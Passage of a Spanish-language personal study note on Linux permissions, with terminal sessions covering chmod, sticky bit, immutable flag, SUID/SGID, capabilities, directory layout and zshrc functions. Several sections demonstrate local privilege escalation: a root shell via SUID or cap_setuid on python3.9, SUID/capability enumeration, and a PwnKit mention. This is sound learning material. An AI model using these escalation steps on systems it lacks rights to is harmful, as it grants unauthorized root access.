.rwxr-xr-x k4rma k4rma   2.0 KB Mon May  2 18:22:50 2022  README.license
❯ chmod g+rx prueba
❯ ls -l
drwxr-xr-x k4rma k4rma    30 B  Tue Jan 17 10:41:02 2023  k4rma
drw-rwx--- root  ALumnos   0 B  Tue Jan 17 12:58:58 2023  prueba
.rwxr-xr-x k4rma k4rma   2.0 KB Mon May  2 18:22:50 2022  README.license
❯ chmod u+x prueba
❯ ls -l
drwxr-xr-x k4rma k4rma    30 B  Tue Jan 17 10:41:02 2023  k4rma
drwxrwx--- root  ALumnos   0 B  Tue Jan 17 12:58:58 2023  prueba
.rwxr-xr-x k4rma k4rma   2.0 KB Mon May  2 18:22:50 2022  README.license
❯ su k4rma
❯ cd prueba
cd: permiso denegado: prueba
❯ su pepe
Contraseña:
┌─[pepe@parrot]─[/home/k4rma/Desktop]
└──╼ $cd prueba
┌─[pepe@parrot]─[/home/k4rma/Desktop/prueba]
└──╼ $touch prueba
┌─[pepe@parrot]─[/home/k4rma/Desktop/prueba]
└──╼ $ls -l
total 0
-rw-r--r-- 1 pepe pepe 0 ene 18 11:05 prueba
```

- Permisos y derechos en Linux: [https://blog.desdelinux.net/permisos-y-derechos-en-linux/?msclkid=22f8cb88ba8111ecb5d8a3db91f066ab](https://blog.desdelinux.net/permisos-y-derechos-en-linux/?msclkid=22f8cb88ba8111ecb5d8a3db91f066ab)

- Permisos básicos en Linux: [https://www.profesionalreview.com/2017/01/28/permisos-basicos-linux-ubuntu-chmod/](https://www.profesionalreview.com/2017/01/28/permisos-basicos-linux-ubuntu-chmod/)

- Permisos en Linux | Cómo son y cómo se cambian: [https://www.softzone.es/programas/linux/permisos-archivos-directorios-linux/](https://www.softzone.es/programas/linux/permisos-archivos-directorios-linux/)

- Cambiar permisos con comandos: [https://www.hostinger.es/tutoriales/cambiar-permisos-y-propietarios-linux-linea-de-comandos/](https://www.hostinger.es/tutoriales/cambiar-permisos-y-propietarios-linux-linea-de-comandos/)

- Asignación de permisos: [https://www.ionos.es/digitalguide/servidores/know-how/asignacion-de-permisos-de-acceso-con-chmod/](https://www.ionos.es/digitalguide/servidores/know-how/asignacion-de-permisos-de-acceso-con-chmod/)

- Propietarios y permisos: [https://atareao.es/tutorial/terminal/propietarios-y-permisos/](https://atareao.es/tutorial/terminal/propietarios-y-permisos/)


*--------------------------------*
 *Notación octal de permisos*
*--------------------------------*

```linux
❯ sudo su
[sudo] password for k4rma:
❯ cd Documentos
❯ mkdir testing
❯ ls -l
drwxr-xr-x k4rma k4rma 82 B Wed Jan 18 11:13:09 2023  apuntes
drwxr-xr-x pepe  pepe   0 B Wed Jan 18 10:48:02 2023  pepe
drwxr-xr-x root  root   0 B Wed Jan 18 11:15:43 2023  testing
❯ chmod 755 testing
❯ ls -l
drwxr-xr-x k4rma k4rma 82 B Wed Jan 18 11:13:09 2023  apuntes
drwxr-xr-x pepe  pepe   0 B Wed Jan 18 10:48:02 2023  pepe
drwxr-xr-x root  root   0 B Wed Jan 18 11:15:43 2023  testing
❯ chmod 542 testing
❯ ls -l
drwxr-xr-x k4rma k4rma 82 B Wed Jan 18 11:13:09 2023  apuntes
drwxr-xr-x pepe  pepe   0 B Wed Jan 18 10:48:02 2023  pepe
dr-xr---w- root  root   0 B Wed Jan 18 11:15:43 2023  testing
❯ chmod 251 testing
❯ ls -l
drwxr-xr-x k4rma k4rma 82 B Wed Jan 18 11:13:09 2023  apuntes
drwxr-xr-x pepe  pepe   0 B Wed Jan 18 10:48:02 2023  pepe
d-w-r-x--x root  root   0 B Wed Jan 18 11:15:43 2023  testing

/* 421-421-421 */

```

- Permisos del sistema de archivos GNU/Linux: [https://blog.alcancelibre.org/staticpages/index.php/permisos-sistema-de-archivos](https://blog.alcancelibre.org/staticpages/index.php/permisos-sistema-de-archivos)


*-------------------------*
 *Permisos especiales*
*-------------------------*
```linux
----------
STICKY BIT
----------
❯ mkdir pruebaspepito
❯ chown pepe:pepe pruebaspepito
❯ ls -l
drwxr-xr-x k4rma k4rma 82 B Wed Jan 18 11:23:12 2023  apuntes
drwxr-xr-x pepe  pepe   0 B Wed Jan 18 10:48:02 2023  pepe
drwxr-xr-x pepe  pepe   0 B Wed Jan 18 11:25:20 2023  pruebaspepito
d-w-r-x--x root  root   0 B Wed Jan 18 11:15:43 2023  testing
❯ chmod 777 pruebaspepito
❯ ls -l
drwxr-xr-x k4rma k4rma 82 B Wed Jan 18 11:23:12 2023  apuntes
drwxr-xr-x pepe  pepe   0 B Wed Jan 18 10:48:02 2023  pepe
drwxrwxrwx pepe  pepe   0 B Wed Jan 18 11:25:20 2023  pruebaspepito
d-w-r-x--x root  root   0 B Wed Jan 18 11:15:43 2023  testing
❯ su pepe
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $cd pruebaspepito
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $whoami
pepe
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $echo Hola probando > file.txt
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $ls -l
total 4
-rw-r--r-- 1 pepe pepe 14 ene 18 11:27 file.txt
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $cat file.txt
Hola probando
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $exti
bash: exti: orden no encontrada
┌─[✗]─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $su k4rma
Contraseña:
❯ whoami
k4rma
❯ ls -l
.rw-r--r-- pepe pepe 14 B Wed Jan 18 11:27:18 2023  file.txt
❯ cat file.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Hola probando
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ rm file.txt
rm: ¿borrar el fichero regular 'file.txt'  protegido contra escritura? (s/n) s
------

/* Aun siendo el file.txt solo de lectura para otros, como esta colgado del directorio pruebapepito(777) prevalece los privilegios de esta/*

------
❯ exit
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $su pepe
Contraseña:
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $cd ..
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $ls
apuntes  pepe  pruebaspepito  testing
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $ls -l
total 0
drwxr-xr-x 1 k4rma k4rma 82 ene 18 11:23 apuntes
drwxr-xr-x 1 pepe  pepe   0 ene 18 10:48 pepe
drwxrwxrwx 1 pepe  pepe   0 ene 18 11:29 pruebaspepito
d-w-r-x--x 1 root  root   0 ene 18 11:15 testing
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $chmod +t pruebaspepitos
chmod: no se puede acceder a 'pruebaspepitos': No existe el fichero o el directorio
-----
/* Aqui estamos aplicando el Sticky bit */
-----
┌─[✗]─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $chmod +t pruebaspepito
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $su k4rma
Contraseña:
❯ whoami
k4rma
❯ cd pruebaspepito
❯ touch file.txt
❯ echo "hola" > file.txt
❯ cat file.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ hola
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ ls -l
.rw-r--r-- k4rma k4rma 5 B Wed Jan 18 11:33:48 2023  file.txt
❯ rm file.txt
❯ ls -l
❯ ls -l
❯ su pepe
Contraseña:
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $cd ..
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $ls -l
total 0
drwxr-xr-x 1 k4rma k4rma 82 ene 18 11:23 apuntes
drwxr-xr-x 1 pepe  pepe   0 ene 18 10:48 pepe
drwxrwxrwt 1 pepe  pepe   0 ene 18 11:34 pruebaspepito
d-w-r-x--x 1 root  root   0 ene 18 11:15 testing
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $chmod +t pruebaspepito
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $ls -l
total 0
drwxr-xr-x 1 k4rma k4rma 82 ene 18 11:23 apuntes
drwxr-xr-x 1 pepe  pepe   0 ene 18 10:48 pepe
drwxrwxrwt 1 pepe  pepe   0 ene 18 11:34 pruebaspepito
d-w-r-x--x 1 root  root   0 ene 18 11:15 testing
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $su k4rma
Contraseña:
❯ su pepe
Contraseña:
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $cd pruebaspepito
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $touch file.txt
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $ls -l
total 0
-rw-r--r-- 1 pepe pepe 0 ene 18 11:37 file.txt
┌─[pepe@parrot]─[/home/k4rma/Documentos/pruebaspepito]
└──╼ $su k4rma
Contraseña:
❯ ls -l
.rw-r--r-- pepe pepe 0 B Wed Jan 18 11:37:30 2023  file.txt
❯ cat file.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file.txt   <EMPTY>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ rm file.txt
rm: ¿borrar el fichero regular vacío 'file.txt'  protegido contra escritura? (s/n) s
rm: no se puede borrar 'file.txt': Operación no permitida

------
/* Al intentar borrar el directorio, al tenenr colgado un archivo que no se puede borrar va a pasar lo siguiente: */
------
❯ rm -rf pruebaspepito
rm: no se puede borrar 'pruebaspepito/file.txt': Operación no permitida
-------------------------------
/*Como root si podrias borrar/*
-------------------------------

-----------------
FLAG DE INMUTABLE
-----------------
❯ sudo su
[sudo] password for k4rma:
❯ rm -rf pruebaspepito
❯ ls -l
drwxr-xr-x k4rma k4rma 82 B Wed Jan 18 11:50:46 2023  apuntes
drwxr-xr-x pepe  pepe   0 B Wed Jan 18 10:48:02 2023  pepe
d-w-r-x--x root  root   0 B Wed Jan 18 11:15:43 2023  testing
❯ cp /etc/hosts prueba
❯ ls -l
drwxr-xr-x k4rma k4rma  82 B Wed Jan 18 11:50:46 2023  apuntes
drwxr-xr-x pepe  pepe    0 B Wed Jan 18 10:48:02 2023  pepe
d-w-r-x--x root  root    0 B Wed Jan 18 11:15:43 2023  testing
.rw-r--r-- root  root  163 B Wed Jan 18 11:58:36 2023  prueba
❯ cat prueba
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: prueba
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Host addresses
   2   │ 127.0.0.1  localhost
   3   │ 127.0.1.1  parrot
   4   │ ::1        localhost ip6-localhost ip6-loopback
   5   │ ff02::1    ip6-allnodes
   6   │ ff02::2    ip6-allrouters
   7   │ # Others
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-----
/*Por si la tensas y borras algun archivo importante hay directorios que tienen copia*/
----
❯ cat /etc/passwd-
❯ ls prueba
 prueba
❯ lsattr // Para listar las flags que tienen los directorios
---------------------- ./apuntes
---------------------- ./pepe
---------------------- ./testing
---------------C------ ./prueba
❯ chattr +i -V // Para aplicar la flag Inmutable, asi no puedes borrarla ni siendo root
Usage: chattr [-pRVf] [-+=aAcCdDeijPsStTuFx] [-v version] files...
❯ chattr +i -V prueba
chattr 1.46.5 (30-Dec-2021)
Flags of prueba set as ----i----------C------
❯ ls -l
drwxr-xr-x k4rma k4rma  82 B Wed Jan 18 11:50:46 2023  apuntes
drwxr-xr-x pepe  pepe    0 B Wed Jan 18 10:48:02 2023  pepe
d-w-r-x--x root  root    0 B Wed Jan 18 11:15:43 2023  testing
.rw-r--r-- root  root  163 B Wed Jan 18 11:58:36 2023  prueba
❯ rm prueba
rm: no se puede borrar 'prueba': Operación no permitida
❯ chattr -i prueba //Para quitar la flag inmutable
❯ lsattr prueba
---------------C------ prueba
❯ rm prueba
❯ ls
 apuntes   pepe   testing

--------------------
PERMISOS SUID Y SGID
--------------------
❯ python3.9
Python 3.9.2 (default, Feb 28 2021, 17:03:44)
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
zsh: suspended  python3.9
❯ which python3.9
/usr/bin/python3.9
❯ which python3.9 | xargs ls -l   // Para consultar en paralelo un which y ls -l, utilizaremos un xargs para el output//
-rwxr-xr-x 1 root root 5479736 feb 28  2021 /usr/bin/python3.9
❯ chmod u+s /usr/bin/python3.9  //Aqui le aplicaremos el permiso SUID, seria lo mismo chmod 4755//
❯ which python3.9 | xargs ls -l
-rwsr-xr-x 1 root root 5479736 feb 28  2021 /usr/bin/python3.9  //Aqui nos fijamos que tiene una s//

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
/*Desde k4rma*/
❯ whoami
k4rma
❯ which pkexec
/usr/bin/pkexec
❯ which pkexec | xargs ls -l
-rwsr-xr-x 1 root root 23448 ene 26  2022 /usr/bin/pkexec  // En pkexec hay una vulnerabilidad con el privilegio SUID, que se llama "PwnKit" Con esto escalabas en privilegios
hasta ROOT //
++++++
Aqui quitar privilegios SUID
+++++
❯ sudo su
[sudo] password for k4rma:
❯ which pkexec | xargs ls -l
-rwsr-xr-x 1 root root 23448 ene 26  2022 /usr/bin/pkexec
❯ chmod u-s /usr/bin/pkexec
❯ which pkexec | xargs ls -l
-rwxr-xr-x 1 root root 23448 ene 26  2022 /usr/bin/pkexec
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

/* De esta forma buscaremos los archivos con permiso SUID que no generen ningún tipo de error
❯ find / -type f -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/ntfs-3g
/usr/bin/passwd
/usr/bin/python3.9
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/xorg/Xorg.wrap
/usr/libexec/polkit-agent-helper-1
/usr/sbin/pppd
/usr/sbin/exim4
/usr/share/codium/chrome-sandbox

------------------------------------------------------
/*Aqui podriamos hacer trastadas dentro de python3.9*/
-----------------------------------------------------
❯ python3.9
Python 3.9.2 (default, Feb 28 2021, 17:03:44)
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("whoami")
root
0
>>> os.system("id")
uid=0(root) gid=0(root) grupos=0(root)
0
>>> os.system("bash")
>>> 
---------------------------------
/*Ya estariamos dentro de root*/
---------------------------------
┌─[root@parrot]─[/home/k4rma/Documentos]
└──╼ #whoami
root

-------------------------------------------------------
SGID- Igual que las SUID pero para privilegios de grupo
-------------------------------------------------------
❯ find / -type f -perm -2000 2>/dev/null
/usr/bin/chage
/usr/bin/crontab
/usr/bin/dotlockfile
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/bin/wall
/usr/bin/write.ul
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/xorg/Xorg.wrap
/usr/lib/w3m/w3mimgdisplay
/usr/sbin/unix_chkpwd
❯ which python3.9
/usr/bin/python3.9
❯ which python3.9 | xargs ls -l
-rwsr-xr-x 1 root root 5479736 feb 28  2021 /usr/bin/python3.9
❯ chmod g+s /usr/bin/python3.9  //seria lo mismo chmod 2755//
❯ which python3.9 | xargs ls -l
-rwsr-sr-x 1 root root 5479736 feb 28  2021 /usr/bin/python3.9
❯ chmod 755 /usr/bin/python3.9
❯ which python3.9 | xargs ls -l
-rwxr-xr-x 1 root root 5479736 feb 28  2021 /usr/bin/python3.9
```


*---------------*
*Cuestionario*
*---------------*
![[Pasted image 20240707194533.png]]
![[Pasted image 20240707194548.png]]
![[Pasted image 20240707194605.png]]
![[Pasted image 20240707194622.png]]
![[Pasted image 20240707194637.png]]
![[Pasted image 20240707194656.png]]
![[Pasted image 20240707194711.png]]
![[Pasted image 20240707194725.png]]

*---------------------------------------*
*Privilegios especiales - Capabilities*
*---------------------------------------*
```linux
❯ which python3.9 | xargs ls -l
-rwxr-xr-x 1 root root 5479736 feb 28  2021 /usr/bin/python3.9
❯ python3.9
Python 3.9.2 (default, Feb 28 2021, 17:03:44)
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)  //No funciona porque no tengo ni privilegios ni esta activada la SUID
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted
>>> os.system("whoami")
k4rma
0
>>> os.setuid(0)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted
>>>
zsh: suspended  python3.9
❯ which getcap  //Aqui es donde se ubica las capabilities//
/usr/sbin/getcap
❯ getcap -r / 2>/dev/null  // Reporte de cabapilities sin que me aparezca por pantalla los STDERR: //
/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip
/usr/bin/fping cap_net_raw=ep
/usr/bin/gnome-keyring-daemon cap_ipc_lock=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
❯ sudo su
[sudo] password for k4rma:
❯ setcap cap_setuid+ep /usr/bin/python3.9   // Aqui le otorgamos la capabilitie //
❯ getcap !$
getcap /usr/bin/python3.9
/usr/bin/python3.9 cap_setuid=ep
❯ python3.9
Python 3.9.2 (default, Feb 28 2021, 17:03:44)
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("whoami")
root   // Ahora estoy dentro Bingo!! //
0
>>>
zsh: suspended  python3.9
❯ setcap cap_setuid-ep /usr/bin/python3.9
❯ getcap !$
getcap /usr/bin/python3.9
/usr/bin/python3.9 =
❯ setcap -r /usr/bin/python3.9
❯ getcap /usr/bin/python3.9
```

[http://www.etl.it.uc3m.es/Linux_Capabilities](http://www.etl.it.uc3m.es/Linux_Capabilities)

*----------------------------*
*Estructura de directorios*
*----------------------------*
### Directorio Raíz

El directorio raíz, simbolizado por el símbolo (/), es el **directorio principal a partir del cual se ramifican todo el resto de directorios**.

### Directorio /bin

El directorio /bin es un **directorio estático y compartible en el que se almacenan archivos binarios/ejecutables necesarios para el funcionamiento del sistema**. Estos archivos binarios los pueden usar la totalidad de usuarios del sistema operativo.

### Directorio /boot

Es un directorio estático no compartible que **contiene la totalidad de archivos necesarios para el arranque del ordenador excepto los archivos de configuración**. Algunos de los archivos indispensables para el arranque del sistema que acostumbra a almacenar el directorio /boot son el kernel y el gestor de arranque Grub.

### Directorio /dev

El sistema operativo Gnu-Linux trata los dispositivos de hardware como si fueran un archivo. **Estos archivos que representan nuestros dispositivos de hardware se hallan almacenados en el directorio /dev**.

Algunos de los archivos básicos que podemos encontrar en este directorio son:

- **cdrom** que representa nuestro dispositivo de CDROM.
- **sda** que representa nuestro disco duro sata.
- **audio** que representa nuestra tarjeta de sonido.
- **psaux** que representa el puerto PS/2.
- **lpx** que representa nuestra impresora.
- **fd0** que representa nuestra disquetera.

### Directorio /etc

El directorio /etc es un **directorio estático que contiene los archivos de configuración del sistema operativo**. Este directorio también contiene archivos de configuración para controlar el funcionamiento de diversos programas.

Algunos de los archivos de configuración de la carpeta /etc pueden ser sustituidos o complementados por archivos de configuración ubicados en nuestra carpeta personal /home.

### Directorio /home

El directorio /home se trata de un **directorio variable y compartible**. Este directorio está **destinado a alojar la totalidad de archivos personales de los distintos usuarios del sistema operativo a excepción del usuario root**. Algunos de los archivos personales almacenados en la carpeta /home son fotografías, documentos de ofimática, vídeos, etc.

### Directorio /lib

El directorio /lib es un **directorio estático y que puede ser compartible**. Este directorio **contiene bibliotecas compartidas que son necesarias para arrancar los ejecutables que se almacenan en los directorios /bin y /sbin**.

### Directorio /mnt

El directorio /mnt **tiene la finalidad de albergar los puntos de montaje de los distintos dispositivos de almacenamiento** como por ejemplo discos duros externos, particiones de unidades externas, etc.

### Directorio /media

La función del directorio /media es similar a la del directorio /mnt. Este directorio **contiene los puntos de montaje de los medios extraíbles de almacenamiento** como por ejemplo memorias USB, lectores de CD-ROM, unidades de disquete, etc.

### Directorio /opt

El contenido almacenado en el directorio /opt **es estático y compartible**. **La función de este directorio es almacenar programas que no vienen con nuestro sistema operativo** como por ejemplo Spotify, Google-earth, Google Chrome, Teamviewer, etc.

### Directorio /proc

El directorio /proc **se trata de un sistema de archivos virtual**. Este sistema de archivos virtual **nos proporciona información acerca de los distintos procesos y aplicaciones que se están ejecutando en nuestro sistema operativo**.

### Directorio /root

El directorio /root se trata de un **directorio variable no compartible**. El directorio /root **es el directorio /home del administrador del sistema** (usuario root).

### Directorio /sbin

El directorio /sbin se trata de un **directorio estático y compartible**. Su función es similar al directorio /bin, pero a diferencia del directorio /bin, el directorio /sbin **almacena archivos binarios/ejecutables que solo puede ejecutar el usuario root** o administrador del sistema.

### Directorio /srv

El directorio /srv se usa **para almacenar directorios y datos que usan ciertos servidores que podamos tener instalados en nuestro ordenador**.

### Directorio /tmp

El directorio /tmp es **donde se crean y se almacenan los archivos temporales y las variables para que los programas puedan funcionar de forma adecuada**.

### Directorio /usr

El directorio /usr es un **directorio compartido y estático**. Este directorio es el que **contiene la gran mayoría de programas instalados** en nuestro sistema operativo.

Todo el contenido almacenado en la carpeta /usr es accesible para todos los usuarios y **su contenido es solo de lectura**.

### Directorio /var

El directorio /var **contiene archivos de datos variables y temporales como por ejemplo los registros del sistema (logs), los registros de programas que tenemos instalados en el sistema operativo, archivos spool, etc.**

**La principal función del directorio /var es la detectar problemas y solucionarlos**. Se recomienda ubicar el directorio /var en una partición propia, y en caso de no ser posible es recomendable ubicarlo fuera de la partición raíz.

### Directorio /sys

Directorio que **contiene información similar a la del directorio /proc**. Dentro de esta carpeta podemos encontrar **i****nformación estructurada y jerárquica acerca del kernel de nuestro equipo, de nuestras particiones y sistemas de archivo, de nuestros drivers**, etc.

### Directorio /lost-found

Directorio que se crea en las particiones de disco con un sistema de archivos ext después ejecutar herramientas para restaurar y recuperar el sistema operativo como por ejemplo fsch.

Si nuestro sistema no ha presentado problemas este directorio estará completamente vacío. En el caso que hayan habido problemas **este directorio contendrá ficheros y directorios que han sido recuperados tras la caída del sistema operativo**.


*--------------------------*
 *Uso de bashrc y zshrc*
*--------------------------*
```linux
pwd
/home/k4rma
❯ ls
 Descargas   Desktop   Documentos   HTB   Imágenes   Música   powerlevel10k   Público   Templates   Vídeos
❯ ls -l
drwxr-xr-x k4rma k4rma 174 B Wed Jan  4 13:35:24 2023  Descargas
drwxr-xr-x k4rma k4rma  50 B Tue Jan 17 12:39:22 2023  Desktop
drwxr-xr-x k4rma k4rma  36 B Wed Jan 18 12:06:07 2023  Documentos
drwxr-xr-x k4rma k4rma   0 B Tue Jan  3 20:19:09 2023  HTB
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Imágenes
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Música
drwxr-xr-x k4rma k4rma 496 B Mon Jan  2 12:14:51 2023  powerlevel10k
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Público
drwxr-xr-x k4rma k4rma  22 B Tue Nov 22 21:19:40 2022  Templates
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Vídeos
----------------------------
Para listar archivos ocultos
----------------------------
❯ ls -a
 .            .cache      .icons     .msf4       Desktop      Música          Vídeos          .emacs      .gtkrc-2.0   .viminfo      .xsession-errors       .zshrc
 ..           .config     .kde       .ssh        Documentos   powerlevel10k   .bash_history   .fehbg      .lesshst     .vimrc        .xsession-errors.old   .zshrc~
 .azure       .dbeaver4   .local     .themes     HTB          Público         .bashrc         .fzf.bash   .p10k.zsh    .wget-hsts    .zcompdump
 .BurpSuite   .fzf        .mozilla   Descargas   Imágenes     Templates       .dmrc           .fzf.zsh    .profile     .Xauthority   .zsh_history
-------------------------
creamos un archivo oculto
-------------------------
❯ mkdir .prueba
❯ ls -l
drwxr-xr-x k4rma k4rma 174 B Wed Jan  4 13:35:24 2023  Descargas
drwxr-xr-x k4rma k4rma  50 B Tue Jan 17 12:39:22 2023  Desktop
drwxr-xr-x k4rma k4rma  36 B Wed Jan 18 12:06:07 2023  Documentos
drwxr-xr-x k4rma k4rma   0 B Tue Jan  3 20:19:09 2023  HTB
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Imágenes
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Música
drwxr-xr-x k4rma k4rma 496 B Mon Jan  2 12:14:51 2023  powerlevel10k
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Público
drwxr-xr-x k4rma k4rma  22 B Tue Nov 22 21:19:40 2022  Templates
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Vídeos
❯ ls -a
 .            .cache      .icons     .msf4     Descargas    Imágenes        Templates       .dmrc       .fzf.zsh     .profile     .Xauthority            .zsh_history
 ..           .config     .kde       .prueba   Desktop      Música          Vídeos          .emacs      .gtkrc-2.0   .viminfo     .xsession-errors       .zshrc
 .azure       .dbeaver4   .local     .ssh      Documentos   powerlevel10k   .bash_history   .fehbg      .lesshst     .vimrc       .xsession-errors.old   .zshrc~
 .BurpSuite   .fzf        .mozilla   .themes   HTB          Público         .bashrc         .fzf.bash   .p10k.zsh    .wget-hsts   .zcompdump
❯ rm -rf .prueba
❯ ls -a
 .            .cache      .icons     .msf4       Desktop      Música          Vídeos          .emacs      .gtkrc-2.0   .viminfo      .xsession-errors       .zshrc
 ..           .config     .kde       .ssh        Documentos   powerlevel10k   .bash_history   .fehbg      .lesshst     .vimrc        .xsession-errors.old   .zshrc~
 .azure       .dbeaver4   .local     .themes     HTB          Público         .bashrc         .fzf.bash   .p10k.zsh    .wget-hsts    .zcompdump
 .BurpSuite   .fzf        .mozilla   Descargas   Imágenes     Templates       .dmrc           .fzf.zsh    .profile     .Xauthority   .zsh_history
❯ cd
❯ echo $SHELL
/usr/bin/zsh
❯ nano .zshrc
❯ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.234.134  netmask 255.255.255.0  broadcast 192.168.234.255
        inet6 fe80::7702:678d:b462:9228  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:60:2b:51  txqueuelen 1000  (Ethernet)
        RX packets 48817  bytes 64417588 (61.4 MiB)
        RX errors 77  dropped 120  overruns 0  frame 0
        TX packets 10275  bytes 2010025 (1.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3014  bytes 445820 (435.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3014  bytes 445820 (435.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

❯ hostname -I
192.168.234.134
❯ hostname -I | awk '{print $1}' //Printear primera posición
192.168.234.134
❯ hostname -I | awk '{print $2}'  //Printear segunda posisción

❯ hostname -I | awk '{print $3}'  //Printear tercera posición

❯ hostname -I | cut -d ' ' -f 1  //Printear primera posición
192.168.234.134
❯ echo "Tu IP privada es: "
Tu IP privada es:
❯ echo "Tu IP privada es:  $(hostname -I | awk '{print $1}')"
---------------------------------------------------------------
Para abrir fichero o directorio desde otra ubicación más arriba
---------------------------------------------------------------
❯ cd Desktop
❯ nano ~/.zshrc
++++++++++++++++++++
Estando en Nano:

 # Funcion personal para ir probando
  48   │ function vermiip(){
  49   │     echo "Tu IP privada es: $(hostname -I | awk '{print $1}')"
  50   │ }
+++++++++++++++++++

❯ vermiip
Tu IP privada es: 192.168.234.134

```
- ¿Qué es Bashrc en Linux?: [https://www.compuhoy.com/que-es-bashrc-en-linux/](https://www.compuhoy.com/que-es-bashrc-en-linux/)

- ¿Por qué deberías usar ZSH?: [https://respontodo.com/que-es-zsh-y-por-que-deberia-usarlo-en-lugar-de-bash/](https://respontodo.com/que-es-zsh-y-por-que-deberia-usarlo-en-lugar-de-bash/)

*--------------------------*
 *Uso y manejo de Tmux
*--------------------------*
![[Tmux-Cheat-Sheet.pdf]]


*-------------------------------*
*Busqueda a nivel de sistema*
*-------------------------------*
```linux
pwd
/home/k4rma
❯ ls
 Descargas   Desktop   Documentos   HTB   Imágenes   Música   powerlevel10k   Público   Templates   Vídeos
❯ ls -l
